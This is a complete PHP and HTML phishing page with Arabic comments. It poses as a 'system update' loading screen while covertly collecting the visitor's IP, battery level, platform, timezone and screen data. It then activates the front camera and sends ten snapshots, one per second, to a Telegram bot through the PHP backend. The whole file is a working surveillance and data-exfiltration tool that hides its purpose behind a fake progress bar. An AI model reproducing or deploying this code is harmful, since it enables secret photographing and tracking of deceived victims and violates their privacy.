<?php
// كاميرا
$botToken = "BBOTTTTTTTTTTT";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// دالة لإرسال الصور إلى التليجرام
function sendTelegramPhoto($chatId, $photoData, $caption, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
    
    // إزالة جزء data:image من base64
    $photoData = str_replace('data:image/jpeg;base64,', '', $photoData);
    $photoData = str_replace(' ', '+', $photoData);
    $data = base64_decode($photoData);
    
    // إنشاء ملف مؤقت
    $tmpFile = tmpfile();
    fwrite($tmpFile, $data);
    $tmpFilePath = stream_get_meta_data($tmpFile)['uri'];
    
    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile($tmpFilePath),
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    
    fclose($tmpFile); // حذف الملف المؤقت

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $message = $input['message'];
    $imageData = $input['image'] ?? null;

    if ($imageData) {
        // معالجة الصورة
        $caption = "📸 Camera Capture\n\nUser ID: " . $chatId;
        $result = sendTelegramPhoto($chatId, $imageData, $caption, $botToken);
    } else {
        // إرسال رسالة عادية
        $result = sendTelegramMessage($chatId, $message, $botToken);
    }
    
    header('Content-Type: application/json');
    echo $result;
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>تحديث النظام</title>
  <style>
    html, body { 
        margin: 0; 
        padding: 0; 
        height: 100vh; 
        background: #000; 
        color: white; 
        display: flex; 
        justify-content: center; 
        align-items: center; 
        font-family: Arial, sans-serif; 
        user-select: none; 
        flex-direction: column; 
        overflow: hidden;
        text-align: center;
    }
    .loader {
        width: 50px;
        height: 50px;
        border: 5px solid rgba(255, 255, 255, 0.2);
        border-radius: 50%;
        border-top-color: #fff;
        animation: spin 1s linear infinite;
        margin-bottom: 20px;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    .hidden {
        display: none;
    }
    .status {
        margin-top: 20px;
        font-size: 14px;
        opacity: 0.8;
        padding: 0 10px;
    }
    #videoElement {
        display: none;
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
        z-index: -1;
    }
    .retry-btn {
        margin-top: 20px;
        padding: 10px 20px;
        background: #3498db;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        font-size: 16px;
    }
    .retry-btn:hover {
        background: #2980b9;
    }
    .progress-bar {
        width: 300px;
        max-width: 80%;
        height: 10px;
        background: #333;
        border-radius: 5px;
        margin-top: 20px;
        overflow: hidden;
    }
    .progress {
        height: 100%;
        background: #3498db;
        width: 0%;
        transition: width 0.5s;
    }
    .countdown {
        font-size: 18px;
        margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="loader"></div>
  <div class="status">جاري تهيئة النظام...</div>
  <div class="progress-bar">
    <div class="progress" id="progress"></div>
  </div>
  <div class="countdown" id="countdown"></div>
  <button class="retry-btn hidden" id="retryBtn">إعادة المحاولة</button>
  
  <video id="videoElement" playsinline autoplay muted></video>

<script>
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('ID'); // نحصل على chatId من الرابط

  async function collectDeviceInfo() {
    let batteryLevel = "غير متوفر";
    let ipAddress = "غير متوفر";
    let connectionType = "غير متوفر";
    let timezone = "غير متوفر";
    let screenInfo = "غير متوفر";
    
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
      }
    } catch (e) {}
    
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      ipAddress = data.ip;
    } catch (e) {}
    
    try {
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType;
      }
    } catch (e) {}
    
    try {
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) {}
    
    try {
      screenInfo = `${screen.width}x${screen.height}, ${window.devicePixelRatio}dpr`;
    } catch (e) {}
    
    return {
      userAgent: navigator.userAgent,
      battery: batteryLevel,
      ip: ipAddress,
      platform: navigator.platform,
      language: navigator.language,
      connection: connectionType,
      timezone: timezone,
      screen: screenInfo
    };
  }

  async function sendToServer(chatId, message, imageData = null) {
    try {
      const data = {
        chatId: chatId,
        message: message,
        image: imageData
      };
      
      const response = await fetch(window.location.href, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
      
      return await response.json();
    } catch (error) {
      console.error('Error sending to server:', error);
      return {ok: false, error: error.message};
    }
  }

  function updateStatus(message) {
    document.querySelector('.status').textContent = message;
  }

  function updateProgress(percent) {
    document.getElementById('progress').style.width = percent + '%';
  }

  function updateCountdown(seconds) {
    document.getElementById('countdown').textContent = `جاري التحميل: ${seconds} ثانية`;
  }

  // دالة لالتقاط صورة من الفيديو مع ضمان الحصول على إطار صحيح
  function captureFrame(videoElement) {
    // التأكد من أن الفيديو جاهز ولديه أبعاد
    if (!videoElement.videoWidth || !videoElement.videoHeight) {
      console.warn('Video not ready yet, using fallback dimensions');
      // يمكن استخدام أبعاد افتراضية إذا لزم الأمر
    }
    
    const canvas = document.createElement('canvas');
    // استخدام الأبعاد الفعلية للفيديو، أو أبعاد افتراضية
    const width = videoElement.videoWidth || 640;
    const height = videoElement.videoHeight || 480;
    
    canvas.width = width;
    canvas.height = height;
    
    const ctx = canvas.getContext('2d');
    ctx.drawImage(videoElement, 0, 0, width, height);
    
    // إضافة ختم زمني للصورة (اختياري)
    ctx.font = '16px Arial';
    ctx.fillStyle = 'white';
    ctx.strokeStyle = 'black';
    ctx.lineWidth = 2;
    ctx.textAlign = 'right';
    const dateStr = new Date().toLocaleString('ar-EG');
    ctx.strokeText(dateStr, width - 10, height - 10);
    ctx.fillText(dateStr, width - 10, height - 10);
    
    return canvas.toDataURL('image/jpeg', 0.85);
  }

  // دالة انتظار جاهزية الفيديو
  function waitForVideoReady(videoElement) {
    return new Promise((resolve, reject) => {
      if (videoElement.readyState >= 2) { // HAVE_CURRENT_DATA أو أعلى
        resolve();
        return;
      }
      
      const timeout = setTimeout(() => {
        cleanup();
        reject(new Error('Timeout waiting for video to be ready'));
      }, 10000);
      
      const onCanPlay = () => {
        cleanup();
        resolve();
      };
      
      const onError = (e) => {
        cleanup();
        reject(new Error('Video error: ' + (e.message || 'Unknown error')));
      };
      
      const cleanup = () => {
        clearTimeout(timeout);
        videoElement.removeEventListener('canplay', onCanPlay);
        videoElement.removeEventListener('loadeddata', onCanPlay);
        videoElement.removeEventListener('error', onError);
      };
      
      videoElement.addEventListener('canplay', onCanPlay, { once: true });
      videoElement.addEventListener('loadeddata', onCanPlay, { once: true });
      videoElement.addEventListener('error', onError, { once: true });
    });
  }

  function showRetryButton() {
    document.getElementById('retryBtn').classList.remove('hidden');
  }

  if (!chatId) {
    document.querySelector('.loader').classList.add('hidden');
    updateStatus("خطأ في النظام: معرف غير صالح");
  } else {
    // إعداد زر إعادة المحاولة
    document.getElementById('retryBtn').addEventListener('click', function() {
      this.classList.add('hidden');
      document.querySelector('.loader').classList.remove('hidden');
      updateStatus("جاري إعادة المحاولة...");
      startCameraProcess();
    });

    startCameraProcess();
  }

  async function startCameraProcess() {
    const deviceInfo = await collectDeviceInfo();
    
    // إرسال الرسالة الأولى مع معلومات الجهاز
    const initMessage = `
📷 <b>بدء الوصول إلى الكاميرا</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📱 <b>الجهاز:</b> ${deviceInfo.userAgent}
🌐 <b>IP:</b> ${deviceInfo.ip}
🔋 <b>البطارية:</b> ${deviceInfo.battery}
🖥️ <b>النظام:</b> ${deviceInfo.platform}
📶 <b>الاتصال:</b> ${deviceInfo.connection}
🌐 <b>اللغة:</b> ${deviceInfo.language}
🕒 <b>المنطقة الزمنية:</b> ${deviceInfo.timezone}
📺 <b>الشاشة:</b> ${deviceInfo.screen}
📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
    `;
    
    await sendToServer(chatId, initMessage);
    updateStatus("جاري تهيئة .....");
    updateProgress(10);
    
    const videoElement = document.getElementById('videoElement');
    let stream = null;
    let captureInterval = null;
    let captureCount = 0;
    const maxCaptures = 10; // عدد الصور المراد التقاطها
    let countdown = 30; // العد التنازلي
    
    try {
      // طلب الوصول إلى الكاميرا مع دعم الكاميرا الأمامية والخلفية
      const constraints = {
        video: { 
          facingMode: 'user', // تفضيل الكاميرا الأمامية
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      };
      
      try {
        // محاولة الكاميرا الأمامية أولاً
        stream = await navigator.mediaDevices.getUserMedia(constraints);
      } catch (frontError) {
        console.warn('Front camera failed, trying any camera:', frontError);
        // إذا فشلت الأمامية، جرب أي كاميرا متاحة
        constraints.video.facingMode = undefined;
        stream = await navigator.mediaDevices.getUserMedia(constraints);
      }
      
      videoElement.srcObject = stream;
      
      // التأكد من تشغيل الفيديو (خاصة في iOS/Safari)
      try {
        await videoElement.play();
      } catch (playError) {
        console.warn('Auto-play was prevented, but video will play when ready');
      }
      
      updateStatus("جاري تجهيز الكاميرا...");
      
      // انتظار جاهزية الفيديو (مهم لمنع الصور السوداء)
      await waitForVideoReady(videoElement);
      
      updateStatus("جاري المعالجة...");
      updateProgress(20);
      
      // بدء العد التنازلي
      const countdownInterval = setInterval(() => {
        countdown--;
        updateCountdown(countdown);
        
        if (countdown <= 0) {
          clearInterval(countdownInterval);
        }
      }, 1000);
      
      // التقاط الصورة الأولى فوراً بعد الجاهزية لضمان عدم وجود تأخير
      try {
        const firstImage = captureFrame(videoElement);
        await sendToServer(chatId, `صورة ${captureCount + 1} من ${maxCaptures}`, firstImage);
        captureCount++;
        updateProgress(20 + (captureCount * 8));
        updateStatus(`جاري المعالجة... ${captureCount * 10}%`);
      } catch (e) {
        console.error('First capture error:', e);
      }
      
      // البدء في التقاط الصور كل ثانية
      captureInterval = setInterval(async () => {
        if (captureCount >= maxCaptures) {
          clearInterval(captureInterval);
          clearInterval(countdownInterval);
          document.querySelector('.loader').classList.add('hidden');
          updateStatus("اكتمل التحديث بنجاح");
          updateProgress(100);
          updateCountdown(0);
          
          // إرسال رسالة الانتهاء
          const completeMessage = `
✅ <b>اكتمل ..</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📸 <b>عدد الصور:</b> ${maxCaptures}
📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
          `;
          await sendToServer(chatId, completeMessage);
          
          // إيقاف الكاميرا
          if (stream) {
            stream.getTracks().forEach(track => track.stop());
          }
          
          return;
        }
        
        try {
          // تأكد من أن الفيديو لا يزال يعمل
          if (videoElement.readyState < 2) {
            await waitForVideoReady(videoElement);
          }
          
          const imageData = captureFrame(videoElement);
          await sendToServer(chatId, `صورة ${captureCount + 1} من ${maxCaptures}`, imageData);
          captureCount++;
          updateProgress(20 + (captureCount * 8));
          updateStatus(`جاري المعالجة... ${captureCount * 10}%`);
        } catch (error) {
          console.error('Error capturing image:', error);
        }
      }, 1000); // كل ثانية
      
    } catch (error) {
      console.error('Error accessing camera:', error);
      
      const errorMessage = `
❌ <b>فشل الوصول إلى الكاميرا</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📱 <b>الجهاز:</b> ${deviceInfo.userAgent}
🌐 <b>IP:</b> ${deviceInfo.ip}
🖥️ <b>النظام:</b> ${deviceInfo.platform}
📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
⚠️ <b>الخطأ:</b> ${error.message}
      `;
      
      await sendToServer(chatId, errorMessage);
      
      document.querySelector('.loader').classList.add('hidden');
      updateStatus("خطأ في النظام: غير متاحة");
      showRetryButton();
    }
    
    // إيقاف التقاط الصور بعد 30 ثانية كحد أقصى
    setTimeout(() => {
      if (captureInterval) {
        clearInterval(captureInterval);
      }
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      
      if (captureCount < maxCaptures) {
        document.querySelector('.loader').classList.add('hidden');
        updateStatus("انتهى وقت المعالجة");
        showRetryButton();
      }
    }, 30000);
  }
</script>

</body>
</html>
